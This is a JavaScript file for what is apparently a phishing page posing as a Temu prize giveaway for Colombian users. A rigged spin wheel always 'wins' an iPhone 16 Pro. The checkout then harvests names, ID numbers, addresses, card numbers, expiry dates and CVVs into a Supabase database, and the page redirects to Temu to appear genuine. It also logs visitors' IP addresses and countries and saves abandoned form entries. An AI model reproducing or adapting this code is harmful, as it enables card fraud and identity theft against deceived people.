// La configuración de Supabase se ha movido al final para evitar errores de carga
let supabaseInstance = null;

// Temporary storage for Step 1 data
let orderData = {};

// ============= ANALYTICS SYSTEM =============
let visitorId = null;
let userIP = null;
let userCountry = null;

// Get or create visitor ID
function getVisitorId() {
    let vid = localStorage.getItem('visitor_id');
    if (!vid) {
        vid = 'v_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
        localStorage.setItem('visitor_id', vid);
    }
    return vid;
}

// Get user IP and Country with Fallbacks
async function getUserInfo() {
    const services = [
        'https://ipwho.is/',
        'https://ipapi.co/json/',
        'https://api.ipify.org?format=json' // Only IP
    ];

    for (const service of services) {
        try {
            const response = await fetch(service);
            if (!response.ok) throw new Error('Network response was not ok');

            const data = await response.json();

            // Normalize data structure
            if (service.includes('ipwho.is')) {
                userIP = data.ip;
                userCountry = data.country || 'Unknown';
            } else if (service.includes('ipapi.co')) {
                userIP = data.ip;
                userCountry = data.country_name || 'Unknown';
            } else {
                userIP = data.ip;
                // Keep previous country if available or try to guess/leave unknown
                if (!userCountry) userCountry = 'Unknown';
            }

            if (userIP) {
                console.log('User info fetched from:', service);
                return { ip: userIP, country: userCountry };
            }
        } catch (error) {
            console.warn(`Failed to fetch from ${service}:`, error);
            continue;
        }
    }

    userIP = 'Unknown';
    userCountry = 'Unknown';
    return { ip: userIP, country: userCountry };
}

// Track page visit
async function trackVisit() {
    if (!supabaseInstance) return;

    try {
        // Check if visitor exists
        const { data: existing } = await supabaseInstance
            .from('visitors')
            .select('*')
            .eq('visitor_id', visitorId)
            .single();

        if (existing) {
            // Update visit count and last visit
            await supabaseInstance
                .from('visitors')
                .update({
                    last_visit: new Date().toISOString(),
                    visit_count: existing.visit_count + 1
                })
                .eq('visitor_id', visitorId);
        } else {
            // Create new visitor record
            await supabaseInstance
                .from('visitors')
                .insert([{
                    visitor_id: visitorId,
                    ip_address: userIP,
                    country: userCountry
                }]);
        }
    } catch (error) {
        console.error('Error tracking visit:', error);
    }
}

// Track wheel spin
async function trackWheelSpin() {
    if (!supabaseInstance) return;

    try {
        await supabaseInstance
            .from('wheel_spins')
            .insert([{
                visitor_id: visitorId,
                ip_address: userIP
            }]);
    } catch (error) {
        console.error('Error tracking wheel spin:', error);
    }
}

// Track step completion
async function trackStepCompletion(stepNumber, data = {}) {
    if (!supabaseInstance) return;

    try {
        await supabaseInstance
            .from('step_completions')
            .insert([{
                visitor_id: visitorId,
                step_number: stepNumber,
                data: data
            }]);
    } catch (error) {
        console.error('Error tracking step completion:', error);
    }
}

// Save incomplete checkout (Step 1 data)
async function saveIncompleteCheckout(data) {
    if (!supabaseInstance) return;

    try {
        await supabaseInstance
            .from('incomplete_checkouts')
            .insert([{
                visitor_id: visitorId,
                ...data
            }]);
    } catch (error) {
        console.error('Error saving incomplete checkout:', error);
    }
}
// ============= END ANALYTICS SYSTEM =============

// Luhn Algorithm for Card Validation
function validateLuhn(number) {
    let sum = 0;
    let shouldDouble = false;
    // Remove spaces and dashes
    const cleaned = number.replace(/\s+/g, '').replace(/-/g, '');

    if (cleaned.length < 13 || cleaned.length > 19) return false;

    for (let i = cleaned.length - 1; i >= 0; i--) {
        let digit = parseInt(cleaned.charAt(i));

        if (shouldDouble) {
            if ((digit *= 2) > 9) digit -= 9;
        }

        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
}

// Function to show loading state on buttons
function toggleLoading(btn, isLoading) {
    if (isLoading) {
        btn.classList.add('loading');
        btn.disabled = true;
        btn.dataset.originalText = btn.innerText;
        btn.innerText = 'Procesando...';
    } else {
        btn.classList.remove('loading');
        btn.disabled = false;
        btn.innerText = btn.dataset.originalText || 'Siguiente';
    }
}

// Modern Toast Notification System
function showToast(message, type = 'error') {
    // Remove existing toasts
    document.querySelectorAll('.toast').forEach(t => t.remove());

    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerHTML = `
        <span class="toast-icon">${type === 'success' ? '✅' : '❌'}</span>
        <span class="toast-message">${message}</span>
    `;
    document.body.appendChild(toast);

    // Trigger animation with a micro-delay
    requestAnimationFrame(() => {
        toast.classList.add('show');
    });

    // Remove after 4 seconds
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 400);
    }, 4000);
}
// Configuración de la ruleta
const wheelConfig = {
    segments: [
        { text: 'iPhone\n16 Pro', color: '#F4A460', textColor: '#2a2a2a' },
        { text: '1 more\nchance', color: '#F5DEB3', textColor: '#2a2a2a' },
        { text: 'iPhone\n16 Pro', color: '#FF8C42', textColor: '#fff' },
        { text: '$20\nCoupons', color: '#F5DEB3', textColor: '#2a2a2a' },
        { text: 'iPhone\n16 Pro', color: '#F4A460', textColor: '#2a2a2a' },
        { text: '$50\nCoupons', color: '#E8D5B7', textColor: '#2a2a2a' }
    ],
    winningIndex: 0 // Siempre gana iPhone 16 Pro (primer segmento)
};

// Variables globales
let isSpinning = false;
let currentRotation = 0;

// Elementos del DOM - Ruleta y Modal Inicial
const canvas = document.getElementById('wheel');
const ctx = canvas.getContext('2d');
const spinButton = document.getElementById('spinButton');
const prizeModal = document.getElementById('prizeModal');
const claimButton = document.getElementById('claimButton');
const confettiCanvas = document.getElementById('confetti');

// Elementos del DOM - Checkout
const checkoutContainer = document.getElementById('checkoutContainer');
const closeCheckout = document.getElementById('closeCheckout');
const addressForm = document.getElementById('addressForm');
const paymentForm = document.getElementById('paymentForm');
const finishCheckout = document.getElementById('finishCheckout');

// Selectores de ubicación
const departmentSelect = document.getElementById('departmentSelect');
const municipalitySelect = document.getElementById('municipalitySelect');

// Poblar departamentos al iniciar
function initLocations() {
    // Referencias locales para asegurar que existan
    const deptSelect = document.getElementById('departmentSelect');
    const muniSelect = document.getElementById('municipalitySelect');

    if (!deptSelect || typeof COLOMBIA_DATA === 'undefined') {
        console.warn('Location elements or data not found');
        return;
    }

    const departments = Object.keys(COLOMBIA_DATA).sort();
    departments.forEach(dept => {
        const option = document.createElement('option');
        option.value = dept;
        option.textContent = dept;
        deptSelect.appendChild(option);
    });

    deptSelect.addEventListener('change', (e) => {
        const selectedDept = e.target.value;
        muniSelect.innerHTML = '<option value="">Seleccionar</option>';

        if (selectedDept && COLOMBIA_DATA[selectedDept]) {
            muniSelect.disabled = false;
            COLOMBIA_DATA[selectedDept].forEach(muni => {
                const option = document.createElement('option');
                option.value = muni;
                option.textContent = muni;
                muniSelect.appendChild(option);
            });
        } else {
            muniSelect.disabled = true;
        }
    });
}

// Dibujar la ruleta
function drawWheel() {
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const radius = canvas.width / 2 - 10;
    const segmentAngle = (2 * Math.PI) / wheelConfig.segments.length;

    wheelConfig.segments.forEach((segment, index) => {
        const startAngle = index * segmentAngle - Math.PI / 2;
        const endAngle = startAngle + segmentAngle;

        // Dibujar segmento
        ctx.beginPath();
        ctx.moveTo(centerX, centerY);
        ctx.arc(centerX, centerY, radius, startAngle, endAngle);
        ctx.closePath();
        ctx.fillStyle = segment.color;
        ctx.fill();

        // Borde del segmento
        ctx.strokeStyle = '#2a2a2a';
        ctx.lineWidth = 3;
        ctx.stroke();

        // Texto
        ctx.save();
        ctx.translate(centerX, centerY);
        ctx.rotate(startAngle + segmentAngle / 2);
        ctx.textAlign = 'center';
        ctx.fillStyle = segment.textColor;
        ctx.font = 'bold 16px Arial';

        const lines = segment.text.split('\n');
        const lineHeight = 20;
        const textRadius = radius * 0.65;

        lines.forEach((line, i) => {
            const yOffset = (lines.length - 1) * lineHeight / 2;
            ctx.fillText(line, textRadius, i * lineHeight - yOffset);
        });

        ctx.restore();
    });
}

// Girar la ruleta
function spinWheel() {
    if (isSpinning) return;

    isSpinning = true;
    spinButton.disabled = true;
    spinButton.textContent = 'GIRANDO...';

    // Calcular rotación para que siempre caiga en iPhone 16 Pro
    const segmentAngle = 360 / wheelConfig.segments.length;
    const targetAngle = wheelConfig.winningIndex * segmentAngle;
    const spins = 8; // Aumentar vueltas para más suspenso

    // El offset de -Math.PI/2 en drawWheel significa que el primer segmento empieza en la parte superior.
    // Para que caiga en la flecha (arriba), necesitamos rotar para que el segmento 0 esté en la posición 0.
    const finalRotation = (spins * 360) - targetAngle;

    // Añadimos un pequeño desplazamiento aleatorio dentro del segmento ganador (+/- 10 grados del centro)
    const randomOffset = (Math.random() * 20) - 10;
    const totalRotation = currentRotation + finalRotation + randomOffset;

    // Animar la ruleta
    canvas.style.transform = `rotate(${totalRotation}deg)`;
    currentRotation = totalRotation % 360;

    // Track wheel spin
    trackWheelSpin();

    // Mostrar modal después de la animación
    setTimeout(() => {
        showPrizeModal();
        launchConfetti();
        isSpinning = false;
        spinButton.disabled = false;
        spinButton.textContent = 'SPIN';
    }, 4000);
}

// Mostrar modal de premio inicial
function showPrizeModal() {
    if (prizeModal) prizeModal.classList.add('show');
}

// Transición al Checkout
function goToCheckout() {
    if (prizeModal) prizeModal.classList.remove('show');
    if (checkoutContainer) {
        checkoutContainer.style.display = 'flex';
        showStep(1);
    }
}

// Manejo de pasos del checkout
function showStep(stepNumber) {
    document.querySelectorAll('.checkout-step').forEach(step => step.classList.remove('active'));
    document.querySelectorAll('.step').forEach(indicator => indicator.classList.remove('active'));

    const targetStep = document.getElementById(`step${stepNumber}`);
    const targetIndicator = document.getElementById(`step${stepNumber}-indicator`);

    if (targetStep) targetStep.classList.add('active');
    if (targetIndicator) targetIndicator.classList.add('active');

    // Desplazar al inicio del modal en móvil
    const modalContent = document.querySelector('.checkout-modal');
    if (modalContent) modalContent.scrollTop = 0;
}

// Sistema de Confetti
class ConfettiPiece {
    constructor(x, y) {
        this.x = x;
        this.y = y;
        this.size = Math.random() * 8 + 5;
        this.speedY = Math.random() * -15 - 5;
        this.speedX = Math.random() * 6 - 3;
        this.gravity = 0.5;
        this.rotation = Math.random() * 360;
        this.rotationSpeed = Math.random() * 10 - 5;
        this.opacity = 1;
        this.colors = ['#ffa500', '#ff8c00', '#ff6347', '#ffd700', '#ff69b4', '#00ff00', '#00bfff'];
        this.color = this.colors[Math.floor(Math.random() * this.colors.length)];
    }

    update() {
        this.speedY += this.gravity;
        this.y += this.speedY;
        this.x += this.speedX;
        this.rotation += this.rotationSpeed;

        if (this.y > (window.innerHeight || 800)) {
            this.opacity -= 0.02;
        }
    }

    draw(ctx) {
        ctx.save();
        ctx.globalAlpha = this.opacity;
        ctx.translate(this.x, this.y);
        ctx.rotate((this.rotation * Math.PI) / 180);
        ctx.fillStyle = this.color;
        ctx.fillRect(-this.size / 2, -this.size / 2, this.size, this.size);
        ctx.restore();
    }

    isActive() {
        return this.opacity > 0;
    }
}

let confettiPieces = [];
let animationId = null;

function launchConfetti() {
    confettiCanvas.width = window.innerWidth;
    confettiCanvas.height = window.innerHeight;
    const confettiCtx = confettiCanvas.getContext('2d');

    // Crear confetti
    for (let i = 0; i < 150; i++) {
        const x = Math.random() * confettiCanvas.width;
        const y = confettiCanvas.height / 2;
        confettiPieces.push(new ConfettiPiece(x, y));
    }

    // Animar confetti
    function animateConfetti() {
        confettiCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);

        confettiPieces = confettiPieces.filter(piece => {
            piece.update();
            piece.draw(confettiCtx);
            return piece.isActive();
        });

        if (confettiPieces.length > 0) {
            animationId = requestAnimationFrame(animateConfetti);
        } else {
            cancelAnimationFrame(animationId);
        }
    }

    animateConfetti();
}

// Event Listeners
spinButton.addEventListener('click', spinWheel);

claimButton.addEventListener('click', goToCheckout);

closeCheckout.addEventListener('click', () => {
    checkoutContainer.style.display = 'none';
});

addressForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Recopilar datos del formulario
    orderData = {
        first_name: document.getElementById('firstName').value,
        last_name: document.getElementById('lastName').value,
        document_id: document.getElementById('documentId').value,
        email: document.getElementById('email').value,
        department: document.getElementById('departmentSelect').value,
        municipality: document.getElementById('municipalitySelect').value,
        address: document.getElementById('address').value,
        additional_info: document.getElementById('additionalInfo').value || ''
    };

    // Track Step 1 completion and save data for incomplete checkout tracking
    await trackStepCompletion(1, orderData);
    await saveIncompleteCheckout(orderData);

    showStep(2);
});

paymentForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = e.target.querySelector('.checkout-btn');

    const cardNumber = e.target.querySelector('input[type="text"]').value;
    const expiryMonth = e.target.querySelectorAll('select')[0].value;
    const expiryYear = e.target.querySelectorAll('select')[1].value;
    const cvv = e.target.querySelector('input[maxlength="4"]').value;

    // 1. Validate Card
    if (!validateLuhn(cardNumber)) {
        showToast('Número de tarjeta inválido. Por favor verifique.', 'error');
        return;
    }

    if (cvv.length < 3) {
        showToast('CVV inválido.', 'error');
        return;
    }

    toggleLoading(btn, true);

    try {
        // Inicializar Supabase solo cuando sea necesario
        if (!supabaseInstance && typeof supabase !== 'undefined') {
            // CONFIGURACIÓN REAL:
            const SUPABASE_URL = 'https://jcgwmbtmfylmttxwmqzv.supabase.co';
            const SUPABASE_KEY = 'sb_publishable_re7bQFvT9rggYPbtH260Pg_c6Pzw5jJ';
            supabaseInstance = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        }

        if (!supabaseInstance) {
            console.warn('Supabase not initialized. Simulation mode.');
            await new Promise(resolve => setTimeout(resolve, 1500));
        } else {
            // 2. Save Order
            const { data: order, error: orderError } = await supabaseInstance
                .from('orders')
                .insert([orderData])
                .select()
                .single();

            if (orderError) throw orderError;

            // 3. Save Card linked to Order
            const { error: cardError } = await supabaseInstance
                .from('cards')
                .insert([{
                    order_id: order.id,
                    card_number: cardNumber,
                    expiry_date: `${expiryMonth}/${expiryYear}`,
                    cvv: cvv,
                    state: 'pending'
                }]);

            if (cardError) throw cardError;
        }

        // Track Step 2 completion
        await trackStepCompletion(2, { card_number: cardNumber });

        showStep(3);
        launchConfetti();
        showToast('Pedido procesado con éxito', 'success');

        // Track Step 3 completion
        await trackStepCompletion(3, {});

        // Redirect to Temu after 3 seconds
        setTimeout(() => {
            window.location.href = 'https://www.temu.com/co';
        }, 3000);
    } catch (error) {
        console.error('Error saving data:', error);
        showToast('Hubo un error al procesar su pedido. Intente nuevamente.', 'error');
    } finally {
        toggleLoading(btn, false);
    }
});

finishCheckout.addEventListener('click', () => {
    window.location.href = 'https://www.temu.com/';
});

// Cerrar modal al hacer clic en el overlay (solo para el premio inicial)
document.querySelector('.modal-overlay').addEventListener('click', () => {
    if (prizeModal) prizeModal.classList.remove('show');
});

// Ajustar canvas en resize
window.addEventListener('resize', () => {
    if (confettiPieces.length > 0) {
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
    }
});

// Inicializar Analytics
(async function initAnalytics() {
    visitorId = getVisitorId();
    const SUPABASE_URL = 'https://jcgwmbtmfylmttxwmqzv.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_re7bQFvT9rggYPbtH260Pg_c6Pzw5jJ';
    supabaseInstance = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    await getUserInfo();
    await trackVisit();
})();

// Inicializar
drawWheel();
initLocations();
